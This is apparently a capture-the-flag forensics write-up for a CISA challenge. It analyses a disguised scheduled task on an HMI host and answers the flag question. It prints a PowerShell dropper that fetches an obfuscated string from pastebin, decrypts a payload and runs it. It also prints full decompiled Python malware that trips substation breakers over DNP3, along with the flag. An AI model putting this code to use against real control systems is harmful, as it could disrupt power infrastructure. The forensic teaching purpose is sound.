# Tripping Breakers

## Description

Attached is a forensics capture of an HMI (human machine interface) containing scheduled tasks, registry hives, and user profile of an operator account. There is a scheduled task that executed in April 2021 that tripped various breakers by sending DNP3 messages. We would like your help clarifying some information. What was the IP address of the `substation_c`, and how many total breakers were tripped by this scheduled task? 

Flag format: flag{IP-Address:# of breakers}. For example if `substation_c`'s IP address was `192.168.1.2` and there were 45 total breakers tripped, the flag would be `flag{192.168.1.2:45}`.

[**Hint**](#hint)

Author: **CISA**

## Solution

### Scheduled task

This challenge give us a Zip file, below is the unzipped directory tree

```
hmi_host_data
└── host
    ├── operator
    │   ├── 3D Objects
    │   │   └── desktop.ini
    │   ├── AppData
    │   │   └── Local
    │   │       ├── ConnectedDevicesPlatform
    │   │       │   ├── CDPGlobalSettings.cdp
    │   │       │   ├── Connected Devices Platform certificates.sst
    │   │       │   ├── L.operator
    │   │       │   │   ├── ActivitiesCache.db
    │   │       │   │   ├── ActivitiesCache.db-shm
    │   │       │   │   └── ActivitiesCache.db-wal
    │   │       │   ├── L.operator.cdp
    │   │       │   └── L.operator.cdpresource
    │   │       ├── IconCache.db
    │   │       ├── PeerDistRepub
    │   │       ├── PlaceholderTileLogoFolder
    │   │       ├── Publishers
    │   │       │   └── 8wekyb3d8bbwe
    │   │       │       ├── Fonts
    │   │       │       ├── Licenses
    │   │       │       ├── mcg
    │   │       │       ├── Microsoft.WindowsAlarms
    │   │       │       └── SettingsContainer
    │   │       ├── Temp
    │   │       │   ├── 18e190413af045db88dfbd29609eb877.db.ses
    │   │       │   ├── aria-debug-4612.log
    │   │       │   ├── aria-debug-5592.log
    │   │       │   ├── chrome_installer.log
    │   │       │   ├── EOTW
    │   │       │   │   └── 151.txt
    │   │       │   ├── Low
    │   │       │   ├── mat-debug-5944.log
    │   │       │   ├── mat-debug-6016.log
    │   │       │   ├── mat-debug-6192.log
    │   │       │   ├── mozilla-temp-files
    │   │       │   ├── wcr_flail.ps1
    │   │       │   ├── wct21AB.tmp
    │   │       │   ├── wct3FD9.tmp
    │   │       │   ├── wct5358.tmp
    │   │       │   ├── wct5A5B.tmp
    │   │       │   ├── wct5EE0.tmp
    │   │       │   ├── wct61B4.tmp
    │   │       │   ├── wct7EC0.tmp
    │   │       │   ├── wct8EB3.tmp
    │   │       │   ├── wctB58.tmp
    │   │       │   ├── wctC334.tmp
    │   │       │   ├── wctE24B.tmp
    │   │       │   └── wctF6EC.tmp
    │   │       └── VirtualStore
    │   ├── Contacts
    │   │   └── desktop.ini
    │   ├── Desktop
    │   │   └── desktop.ini
    │   ├── Documents
    │   │   └── desktop.ini
    │   ├── Downloads
    │   │   └── desktop.ini
    │   ├── Favorites
    │   │   ├── Bing.url
    │   │   ├── desktop.ini
    │   │   └── Links
    │   │       └── desktop.ini
    │   ├── Links
    │   │   ├── desktop.ini
    │   │   ├── Desktop.lnk
    │   │   └── Downloads.lnk
    │   ├── Music
    │   │   └── desktop.ini
    │   ├── OneDrive
    │   │   └── desktop.ini
    │   ├── Pictures
    │   │   ├── Camera Roll
    │   │   │   └── desktop.ini
    │   │   ├── desktop.ini
    │   │   └── Saved Pictures
    │   │       └── desktop.ini
    │   ├── Saved Games
    │   │   └── desktop.ini
    │   ├── Searches
    │   │   ├── desktop.ini
    │   │   ├── Everywhere.search-ms
    │   │   ├── Indexed Locations.search-ms
    │   │   └── winrt--{S-1-5-21-2886231043-3870846703-4200798780-1002}-.searchconnector-ms
    │   └── Videos
    │       └── desktop.ini
    ├── Registry
    │   └── SOFTWARE_ROOT.json
    └── scheduled_tasks.csv

37 directories, 53 files
```
Assuming that, `hmi_host_data\host` are my root directory (and we are in root dir)

First of all, the `description` says that "there is a scheduled task that executed in April 2021". And I found the file named `scheduled_tasks.csv` under `host` directory. After removing the things that don't make sense, there's one line left that seems to be related to what we're looking for.


|   HostName   |                     TaskName                     |    Next Run Time     | Status |       Logon Mode       |    Last Run Time    | Last Result |       Author        |                         Task To Run                         | Start In | Comment | Scheduled Task State | Idle Time |   Power Management   | Run As User | Delete Task If Not Rescheduled | Stop Task If Runs X Hours and X Mins |                     Schedule                     | Schedule Type | Start Time | Start Date | End Date | Days | Months | Repeat: Every | Repeat: Until: Time | Repeat: Until: Duration | Repeat: Stop If Still Running |
|--------------|--------------------------------------------------|----------------------|--------|------------------------|---------------------|-------------|---------------------|-------------------------------------------------------------|----------|---------|----------------------|-----------|----------------------|-------------|--------------------------------|--------------------------------------|--------------------------------------------------|---------------|------------|------------|----------|------|--------|---------------|---------------------|-------------------------|-------------------------------|
| AP-G-DIST-57 | \Microsoft\Windows\Energy Conservation\LightsOff | 4/21/2021 5:30:00 PM | Ready  | Interactive/Background | 4/1/2021 7:43:55 AM |           1 | AP-G-DIST-57\Tyrell | Powershell.exe -ExecutionPolicy Bypass %temp%\wcr_flail.ps1 | N/A      | N/A     | Enabled              | Disabled  | Stop On Battery Mode | operator    | Disabled                       | Disabled                             | Scheduling data is not available in this format. | One Time Only | 5:30:00 PM | 4/21/2021  | N/A      | N/A  | N/A    | Disabled      | Disabled            | Disabled                | Disabled                      |


With taskname is `\Microsoft\Windows\Energy Conservation\LightsOff` and was executed in `4/21/2021 5:30:00 PM`, this is exactly what we're looking for.

### Powershell script

Next, let's see what the powershell script located at `%temp%\wcr_flail.ps1` or `hmi_host_data\host\operator\AppData\Local\Temp\wcr_flail.ps1` will do 

```powershell
$SCOP = ((new-object System.Net.WebClient).DownloadString("https://pastebin.com/raw/rBXHdE85"))
        .Replace("!","f")
        .Replace("@","q")
        .Replace("#","z")
        .Replace("<","B")
        .Replace("%","K")
        .Replace("^","O")
        .Replace("&","T")
        .Replace("*","Y")
        .Replace("[","4")
        .Replace("]","9")
        .Replace("{","=");
$SLPH = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($SCOP)); 
$E=(Get-ItemProperty -Path $SLPH -Name Blast)."Blast";
$TWR =  "!M[[pcU09%d^kV&l#9*0XFd]cVG93<".Replace("!","SEt")
                                        .Replace("@","q")
                                        .Replace("#","jcm")
                                        .Replace("<","ZXI=")
                                        .Replace("%","GVF")
                                        .Replace("^","BU")
                                        .Replace("&","cTW")
                                        .Replace("*","zb2Z")
                                        .Replace("[","T")
                                        .Replace("]","iZW1")
                                        .Replace("{","Fdi");
$BRN = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($TWR)); 
$D= (Get-ItemProperty -Path $BRN -Name Off)."Off";
openssl aes-256-cbc -a -A -d -salt -md sha256 -in $env:temp$D -pass pass:$E -out "c:\1\fate.exe";
C:\1\fate.exe;
```

We can efficiently obtain the values of the variables.

```powershell
# Download a file from the Pastebin, and replace characters in its content with appropriate rules
$SCOP   == 'SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcVGFibGV0UENcQmVsbA=='
# then decode from base64
$SLPH   == 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\TabletPC\\Bell'

$TWR    == 'SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdiZW1cVG93ZXI='
# then decode from base64
$BRN    == 'HKLM:\\SOFTWARE\\Microsoft\\Wbem\\Tower'
```

Seem we have to find two registry items, and luckily we also have registry file at `host\Registry\SOFTWARE_ROOT.json`. Below is the two items that we need

```json
{
    "KeyPath": "ROOT\\Microsoft\\Wbem\\Tower",
    "KeyName": "Tower",
    "LastWriteTimestamp": "\/Date(1617231936549)\/",
    "SubKeys": [],
    "Values": [
        {
            "ValueName": "Off",
            "ValueType": "RegSz",
            "ValueData": "\\EOTW\\151.txt",
            "DataRaw": "XABFAE8AVABXAFwAMQA1ADEALgB0AHgAdAAAAA==",
            "Slack": ""
        }
    ]
}

{
    "KeyPath": "ROOT\\Microsoft\\Windows\\TabletPC\\Bell",
    "KeyName": "Bell",
    "LastWriteTimestamp": "\/Date(1617231990846)\/",
    "SubKeys": [],
    "Values": [
        {
            "ValueName": "Blast",
            "ValueType": "RegSz",
            "ValueData": "M4RK_MY_W0Rd5",
            "DataRaw": "TQA0AFIASwBfAE0AWQBfAFcAMABSAGQANQAAAA==",
            "Slack": ""
        }
    ]
}
```

Then we can obtain the others variables value

```powershell
# $E=(Get-ItemProperty -Path $SLPH -Name Blast)."Blast";
$E == "M4RK_MY_W0Rd5"
# $D= (Get-ItemProperty -Path $BRN -Name Off)."Off";
$D == "\\EOTW\\151.txt"
# openssl aes-256-cbc -a -A -d -salt -md sha256 -in $env:temp$D -pass pass:$E -out "c:\1\fate.exe";
openssl aes-256-cbc -a -A -d -salt -md sha256 -in \operator\AppData\Local\Temp\EOTW\151.txt -pass pass:M4RK_MY_W0Rd5 -out "c:\1\fate.exe";
```

**Conclusion**, this powershell script will decrypt file `151.txt` with pass `M4RK_MY_W0Rd5` to an executable file named `fate.exe` and execute it.

### fate.exe - Executable file

Check with ExeinfoPE, I found that the source file was written in Python, compiled with PyInstaller v3.6. After many tries, I realized I have to use Python 3.6 to extract to the content.

> [ PyInstaller v.3.6  - 2005–2019 - support Python 2.7, 3.5–3.7 www.pyinstaller.org ] - stub :  x64 Microsoft Visual C++ v14.0 - 2015 - microsoft.com (exe 4883ec 28-48)

First, I use [`PyInstaller Extractor`](https://github.com/extremecoders-re/pyinstxtractor) (with **Python 3.6**) to extract the contents of a PyInstaller generated Windows executable file.

Last, I use [`uncompyle6`](https://github.com/rocky/python-uncompyle6) to decompile the `trip_breakers.pyc` file, which our main file to inspect.

### trip_breakers.py - Main python source code file

Here is the source file for the challenge

```python
# uncompyle6 version 3.7.5.dev0
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.7.6 (default, Sep 11 2021, 18:52:43) 
# [GCC 10.2.1 20210110]
# Embedded file name: trip_breakers.py
import struct, socket, time, sys
from crccheck.crc import Crc16Dnp
OPT_1 = 3
OPT_2 = 4
OPT_3 = 66
OPT_4 = 129

class Substation:

    def __init__(self, ip_address, devices):
        self.target = ip_address
        self.devices = []
        self.src = 50
        self.transport_seq = 0
        self.app_seq = 10
        for device in devices:
            self.add_device(device)

        self.connect()

    def connect(self):
        print('Connecting to {}...'.format(self.target))
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.target, 20000))
        print('Connected to {}'.format(self.target))

    def add_device(self, device):
        self.devices.append({'dst':device[0],  'count':device[1]})

    def activate_all_breakers(self, code):
        for device in self.devices:
            dnp3_header = self.get_dnp3_header(device['dst'])
            for x in range(1, device['count'] * 2, 2):
                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_1, code)
                self.socket.send(dnp3_packet)
                time.sleep(2)
                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_2, code)
                self.socket.send(dnp3_packet)
                time.sleep(5)

    def get_dnp3_header(self, dst):
        data = struct.pack('<H2B2H', 25605, 24, 196, dst, self.src)
        data += struct.pack('<H', Crc16Dnp.calc(data))
        return data

    def get_dnp3_data(self, index, function, code):
        data = struct.pack('<10BIH', 192 + self.transport_seq, 192 + self.app_seq, function, 12, 1, 23, 1, index, code, 1, 500, 0)
        data += struct.pack('<H', Crc16Dnp.calc(data))
        data += struct.pack('<HBH', 0, 0, 65535)
        self.transport_seq += 1
        self.app_seq += 1
        if self.transport_seq >= 62:
            self.transport_seq = 0
        if self.app_seq >= 62:
            self.app_seq = 0
        return data


def main():
    if socket.gethostname() != 'hmi':
        sys.exit(1)
    substation_a = Substation('10.95.101.80', [(2, 4), (19, 8)])
    substation_b = Substation('10.95.101.81', [(9, 5), (8, 7), (20, 12), (15, 19)])
    substation_c = Substation('10.95.101.82', [(14, 14), (9, 16), (15, 4), (12, 5)])
    substation_d = Substation('10.95.101.83', [(20, 17), (16, 8), (8, 14)])
    substation_e = Substation('10.95.101.84', [(12, 4), (13, 5), (4, 2), (11, 9)])
    substation_f = Substation('10.95.101.85', [(1, 4), (3, 9)])
    substation_g = Substation('10.95.101.86', [(10, 14), (20, 7), (27, 4)])
    substation_h = Substation('10.95.101.87', [(4, 1), (10, 9), (13, 6), (5, 21)])
    substation_i = Substation('10.95.101.88', [(14, 13), (19, 2), (8, 6), (17, 8)])
    substation_a.activate_all_breakers(OPT_3)
    substation_b.activate_all_breakers(OPT_4)
    substation_c.activate_all_breakers(OPT_4)
    substation_d.activate_all_breakers(OPT_4)
    substation_e.activate_all_breakers(OPT_3)
    substation_f.activate_all_breakers(OPT_4)
    substation_g.activate_all_breakers(OPT_3)
    substation_h.activate_all_breakers(OPT_4)
    substation_i.activate_all_breakers(OPT_4)


if __name__ == '__main__':
    main()
```

**First question,** the IP address of the `substation_c` : `10.95.101.82`

To answer the second question, I need to clarify some information. 
* A substation have some devices, with a device is a tuple of two integers (int, int). The later integer is number of breakers that are managed by the device.
* You have to learn something about DNP3 protocol and DNP3 messages ([this is](https://www.kepware.com/getattachment/ae44d711-0ccb-4cf3-b1e5-6a914bd9b25e/DNP3-Control-Relay-Output-Block-Command.pdf) good for you). In the source code, the `code` parameter in `activate_all_breakers` and `get_dnp3_data` is the `Control Code` with 8-bit length (read the file about DNP3 I attached above). And control code to trip a breaker have first two bit is `10`. Therefore, `OPT_4` is the code to trip all the breakers.

**Conclusion**, the IP address of the `substation_c` is `10.95.101.82`. And breakers that are managed by `substations (b, c, d, f, h, i)` were tripped by the task. Number of breaker are `200`.

>Another tip for you. You can create some localhost sockets that listening on port 20000 (like the source code or change with your choice). Use `wireshark` to capture the packets. Filter out with filter `dnp3.ctl.trip==2`, count the packets and divide by 2 (a breaker have 2 packets, one is the `SELECT` Request Data Objects and the other is `OPERATE` Request Data Objects)

## Flag

> flag{10.95.101.82:200}

## Hint

The challenge prompt asks for the number of breakers that were tripped by the task. To clarify, it refers to breakers that were tripped for all substations, not just `substation_c`.
